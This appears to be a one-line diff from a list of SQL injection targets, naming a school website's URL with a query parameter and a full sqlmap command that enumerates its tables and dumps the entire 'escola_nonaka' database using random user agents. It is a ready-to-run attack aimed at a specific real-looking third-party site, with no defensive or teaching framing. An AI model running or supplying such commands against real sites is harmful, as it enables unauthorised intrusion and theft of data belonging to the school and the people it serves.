@@ -1,0 +1,1 @@
+http://www.escolanonaka.com.br/./index.php?page=unidades&num=9 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.escolanonaka.com.br/./index.php?page=unidades&num=9 -D escola_nonaka --tables --dump-all
